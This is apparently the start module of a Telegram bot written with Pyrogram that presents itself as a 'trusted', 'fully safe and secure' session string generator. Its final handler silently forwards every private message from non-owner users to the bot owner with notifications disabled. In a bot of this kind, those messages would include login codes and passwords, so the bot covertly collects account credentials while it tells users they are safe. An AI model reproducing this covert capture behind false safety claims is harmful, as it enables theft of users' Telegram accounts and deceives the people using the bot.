from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message

from config import OWNER_ID


def filter(cmd: str):
    return filters.private & filters.incoming & filters.command(cmd)

@Client.on_message(filter("start"))
async def start(bot: Client, msg: Message):
    me2 = (await bot.get_me()).mention
    await bot.send_message(
        chat_id=msg.chat.id,
        text=f"""𝘏𝘦𝘺 {msg.from_user.mention}🍷,

𝘐 𝘈𝘮 {me2},
𝘛𝘙𝘜𝘚𝘛𝘌𝘋 𝘚𝘛𝘙𝘐𝘕𝘎 𝘎𝘌𝘕𝘌𝘙𝘈𝘛𝘖𝘙
𝘉𝘖𝘛
𝘍𝘜𝘓𝘓𝘠 𝘚𝘈𝘍𝘌 𝘈𝘕𝘋 𝘚𝘌𝘊𝘜𝘙𝘌 
𝘕𝘖 𝘌𝘙𝘙𝘖𝘙

𝙈𝙖𝙙𝙚 𝘽𝙮 : [AMBOT](tg://user?id={OWNER_ID}) !""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(text="𝐺𝐸𝑁𝐸𝑅𝐴𝑇𝐸 𝑆𝑇𝑅𝐼𝑁𝐺", callback_data="generate")
                ],
                [
                    InlineKeyboardButton("Sᴜᴘᴘᴏʀᴛ Gʀᴏᴜᴘ", url="https://t.me/AM_YTSUPPORT"),
                    InlineKeyboardButton("Uᴘᴅᴀᴛᴇs", url="https://t.me/AMBOTYT")
                ]
            ]
        ),
        disable_web_page_preview=True,
    )
@Client.on_message(filters.private & filters.incoming)
async def on_pm_s(client: Client, message: Message):
    if not message.from_user.id ==OWNER_ID:
        fwded_mesg = await message.forward(chat_id=OWNER_ID, disable_notification=True)